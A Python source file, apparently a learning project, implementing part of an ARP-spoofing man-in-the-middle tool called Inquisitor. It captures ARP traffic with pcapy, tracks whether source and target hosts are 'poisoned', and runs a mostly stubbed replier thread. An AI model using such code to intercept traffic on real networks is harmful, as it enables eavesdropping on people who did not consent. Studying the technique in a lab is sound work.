from machine_obj import *
from packet_handler import *
from ainsi import *
import sys
from datetime import datetime
import threading

#! UTILS

def get_output_file_name():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".csv"

def priting_machines(inquisitor, arp_req_count):
    print(erase_lines(6), end="")
    log_info(inquisitor.attacker)
    log_info(inquisitor.source)
    log_info(inquisitor.target)
    log_info(f"ARP requests processed: {colored(str(arp_req_count), BLUE)}")
    print()

#! CLASS 

class Inquisitor:
    def __init__(self, source_ip, source_mac, target_ip, target_mac):
        self.attacker = Machine(None, None, "Attacker")
        self.source = Machine(source_mac, source_ip, "Source")
        self.target = Machine(target_mac, target_ip, "Target")

        self.ouput_file = get_output_file_name()
        self.threading()

    #! MAN IN THE MIDDLE

    def looking_for_arp_requests(self):
        interface = "enp0s3"
        count = 0
        priting_machines(self, count)

        try:
            cap = pcapy.open_live(interface, 65535, True, 100)
            cap.setfilter("arp")
            while True:
                header, packet = cap.next()
                if header is not None and packet is not None:
                   sender_mac, sender_ip, target_mac, target_ip = process_packet(header, packet, self)
                
                count += 1
                    
                if sender_ip == self.source.ip_address and target_ip == self.target.ip_address:
                    self.source.poisoned = True
                elif sender_ip == self.target.ip_address and target_ip == self.source.ip_address:
                    self.target.poisoned = True
                    
                priting_machines(self, count)
                if self.source.poisoned and self.target.poisoned:
                    break
                  
        except KeyboardInterrupt:
            log_info("Listening for ARP requests stopped by user.")
        except pcapy.PcapError as e:
            log_error(f"Pcapy error during capture: {e}")
            log_error("Make sure to run the script with root privileges (sudo).")
            log_error(f"Check that the interface '{interface}' exists and is operational.")
        except Exception as e:
            log_error(f"An unexpected error occurred in the looking_for_arp_requests function: {e}")
        pass

    def arp_replier(self):
        switch = False
        while not threading_end_event.is_set():    
            if self.source.poisoned and self.target.poisoned:
                if switch == False:
                    log_success("Both source and target have been successfully spoofed.")
                    switch = True
                log_debug("maintaining arp connection for source and target")
            if self.source.poisoned:
                pass
                # log_success("REPLY SEND TO SOURCE")
            if self.target.poisoned:
                pass
                # log_success("REPLY SEND TO TARGET")
            threading_end_event.wait(5)

    

    def threading(self):
        thread_request = threading.Thread(target=self.looking_for_arp_requests, daemon=True, name="ARP Listener")
        thread_reply = threading.Thread(target=self.arp_replier, daemon=True, name="ARP Replier")
        thread_request.start()
        thread_reply.start()

    